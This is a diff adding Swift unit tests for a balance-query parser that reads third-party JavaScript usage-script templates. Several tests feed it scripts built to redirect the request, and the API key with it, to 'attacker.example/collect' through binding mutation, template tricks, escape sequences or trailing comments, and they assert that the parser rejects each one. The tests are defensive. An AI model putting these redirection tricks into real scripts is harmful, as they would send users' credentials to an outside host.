@@ -2210,6 +2210,261 @@ final class DomainModelsTests: XCTestCase {
         XCTAssertEqual(failure, .credentialMissing)
     }
 
+    func testBalanceQueryParsesCCSwitchGenericTemplate() throws {
+        // Issue #484: CC Switch generic template for third-party providers
+        let ccswitchCode = """
+        ({
+          request: {
+            url: "{{baseUrl}}/user/balance",
+            method: "GET",
+            headers: {
+              "Authorization": "Bearer {{apiKey}}",
+              "User-Agent": "cc-switch/1.0"
+            }
+          },
+          extractor: function(response) {
+            return {
+              isValid: response.is_active || true,
+              remaining: response.balance,
+              unit: "USD"
+            };
+          }
+        })
+        """
+        let metaObject: [String: Any] = [
+            "usage_script": [
+                "enabled": true,
+                "code": ccswitchCode,
+                "autoQueryInterval": 30,
+                "timeout": 15
+            ]
+        ]
+        let metaText = String(
+            data: try JSONSerialization.data(withJSONObject: metaObject),
+            encoding: .utf8
+        )
+        let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.huanling.example"}"#
+
+        var failure: BalanceQueryFailure?
+        let query = BalanceQuery.make(
+            settingsText: settingsText,
+            metaText: try XCTUnwrap(metaText),
+            websiteText: nil,
+            appType: "claude",
+            onFailure: { failure = $0 }
+        )
+
+        XCTAssertNil(failure, "Should not fail with: \(failure?.diagnostic ?? "none")")
+        XCTAssertEqual(query?.url, "https://api.huanling.example/user/balance")
+        XCTAssertEqual(query?.apiKey, "test-key")
+        XCTAssertEqual(query?.intervalMinutes, 30)
+        XCTAssertEqual(query?.timeoutSeconds, 15)
+    }
+
+    func testBalanceQueryHandlesQuotedKeyVariations() throws {
+        let variations: [(String, String)] = [
+            (#""url": "{{baseUrl}}/balance""#, "double-quoted key and value"),
+            (#"'url': '{{baseUrl}}/balance'"#, "single-quoted key and value"),
+            (#""url": '{{baseUrl}}/balance'"#, "double-quoted key, single-quoted value"),
+            (#"'url': "{{baseUrl}}/balance""#, "single-quoted key, double-quoted value"),
+            ("url: `{{baseUrl}}/balance`", "unquoted key, backtick value"),
+        ]
+
+        for (urlSnippet, description) in variations {
+            let code = "({ request: { \(urlSnippet) } })"
+            let metaObject: [String: Any] = [
+                "usage_script": [
+                    "enabled": true,
+                    "code": code
+                ]
+            ]
+            let metaText = String(
+                data: try JSONSerialization.data(withJSONObject: metaObject),
+                encoding: .utf8
+            )
+            let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#
+
+            var failure: BalanceQueryFailure?
+            let query = BalanceQuery.make(
+                settingsText: settingsText,
+                metaText: try XCTUnwrap(metaText),
+                websiteText: nil,
+                appType: "claude",
+                onFailure: { failure = $0 }
+            )
+
+            XCTAssertNil(failure, "[\(description)] Should not fail")
+            XCTAssertEqual(
+                query?.url,
+                "https://api.example.test/balance",
+                "[\(description)] URL should be correctly extracted and substituted"
+            )
+        }
+    }
+
+    func testBalanceQueryHandlesWhitespaceVariations() throws {
+        let variations = [
+            #"url:"{{baseUrl}}/balance""#,
+            #"url :"{{baseUrl}}/balance""#,
+            #"url: "{{baseUrl}}/balance""#,
+            #"url : "{{baseUrl}}/balance""#,
+            #"url  :  "{{baseUrl}}/balance""#,
+        ]
+
+        for urlSnippet in variations {
+            let code = "({ request: { \(urlSnippet) } })"
+            let metaObject: [String: Any] = [
+                "usage_script": [
+                    "enabled": true,
+                    "code": code
+                ]
+            ]
+            let metaText = String(
+                data: try JSONSerialization.data(withJSONObject: metaObject),
+                encoding: .utf8
+            )
+            let settingsText = #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#
+
+            let query = BalanceQuery.make(
+                settingsText: settingsText,
+                metaText: try XCTUnwrap(metaText),
+                websiteText: nil,
+                appType: "claude"
+            )
+
+            XCTAssertEqual(
+                query?.url,
+                "https://api.example.test/balance",
+                "Whitespace variation [\(urlSnippet)] should work"
+            )
+        }
+    }
+
+    func testBalanceQueryEvaluatesComputedURLFromIIFEScript() throws {
+        let code = """
+        ({
+            request: (() => {
+              const base = "{{baseUrl}}".replace(/\\/+$/, "").replace(/\\/v1$/i, "");
+              return {
+                url: base + "/v1/usage",
+                method: "GET",
+                headers: { "Authorization": "Bearer {{apiKey}}" }
+              };
+            })(),
+            extractor: function(response) {
+              return { isValid: true, remaining: response?.remaining, unit: "USD" };
+            }
+          })
+        """
+        let metaObject: [String: Any] = [
+            "usage_script": ["enabled": true, "code": code, "templateType": ""]
+        ]
+        let metaText = String(
+            data: try JSONSerialization.data(withJSONObject: metaObject),
+            encoding: .utf8
+        )
+        let settingsText = #"{"env":{"ANTHROPIC_AUTH_TOKEN":"test-key","ANTHROPIC_BASE_URL":"https://api.example.test/v1/"}}"#
+
+        let query = BalanceQuery.make(
+            settingsText: settingsText,
+            metaText: try XCTUnwrap(metaText),
+            websiteText: nil,
+            appType: "claude"
+        )
+
+        XCTAssertEqual(query?.url, "https://api.example.test/v1/usage")
+        XCTAssertEqual(query?.apiKey, "test-key")
+    }
+
+    func testBalanceQueryRejectsUnevaluableURLInsteadOfSendingKeyToTruncatedURL() throws {
+        let code = """
+        const docs = { url: "https://docs.example.com" };
+        ({ request: { url: "{{baseUrl}}/api/user/self?id=" + userId } })
+        """
+        let metaText = String(
+            data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]),
+            encoding: .utf8
+        )
+
+        var failure: BalanceQueryFailure?
+        let query = BalanceQuery.make(
+            settingsText: #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#,
+            metaText: try XCTUnwrap(metaText),
+            websiteText: nil,
+            appType: "claude",
+            onFailure: { failure = $0 }
+        )
+
+        XCTAssertNil(query)
+        XCTAssertEqual(failure, .requestEndpointMissing)
+    }
+
+    func testBalanceQueryRejectsNestedRequestOutsideFinalConfig() throws {
+        let code = """
+        const metadata = {
+          request: { url: "https://attacker.example/collect" }
+        };
+        ({
+          extractor: function(response) { return response; }
+        })
+        """
+        let metaText = String(
+            data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]),
+            encoding: .utf8
+        )
+        var failure: BalanceQueryFailure?
+        let query = BalanceQuery.make(
+            settingsText: #"{"apiKey":"test-key","baseUrl":"https://api.example.test"}"#,
+            metaText: try XCTUnwrap(metaText),
+            websiteText: nil,
+            appType: "claude",
+            onFailure: { failure = $0 }
+        )
+        XCTAssertNil(query)
+        XCTAssertEqual(failure, .requestEndpointMissing)
+    }
+
+    func testBalanceQueryRejectsMutatedBindingsAndUnsupportedEscapes() throws {
+        let codes = [
+            #"const req = { url: 'https://attacker.example/collect' }; req.url = '{{baseUrl}}/usage'; ({ request: req })"#,
+            #"const req = { url: 'https://attacker.example/collect' } && { url: '{{baseUrl}}/usage' }; ({ request: req })"#,
+            #"({ request: { url: 'https://\x61pi-vendor.com/usage' } })"#,
+            #"({ request: { url: `https://\u0061pi-vendor.com/usage` } })"#,
+            #"({ request: { url: 'https://api.example/v1'.replaceAll(/v1/, 'usage') } })"#
+        ]
+        for code in codes {
+            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
+            var failure: BalanceQueryFailure?
+            let query = BalanceQuery.make(
+                settingsText: #"{"apiKey":"test-key","baseUrl":"https://api-vendor.com"}"#,
+                metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude",
+                onFailure: { failure = $0 }
+            )
+            XCTAssertNil(query, code)
+            XCTAssertEqual(failure, .requestEndpointMissing, code)
+        }
+    }
+
+    func testBalanceQueryRejectsTemplateMutationAndUnterminatedComment() throws {
+        let codes = [
+            """
+            let base = "https://attacker.example/collect";
+            const note = `${base = "{{baseUrl}}/usage"}`;
+            ({ request: { url: base } })
+            """,
+            """
+            ({ request: { url: "https://attacker.example/collect" } }) /*
+            """
+        ]
+        for code in codes {
+            let metaText = String(data: try JSONSerialization.data(withJSONObject: ["usage_script": ["enabled": true, "code": code]]), encoding: .utf8)
+            var failure: BalanceQueryFailure?
+            let query = BalanceQuery.make(settingsText: #"{"apiKey":"test-key","baseUrl":"https://provider.example"}"#, metaText: try XCTUnwrap(metaText), websiteText: nil, appType: "claude", onFailure: { failure = $0 })
+            XCTAssertNil(query)
+            XCTAssertEqual(failure, .requestEndpointMissing)
+        }
+    }
+
     private func makeDefaults() -> (UserDefaults, String) {
         let suiteName = "BalanceBarTests.ProviderBalanceProgress.\(UUID().uuidString)"
         let defaults = UserDefaults(suiteName: suiteName)!
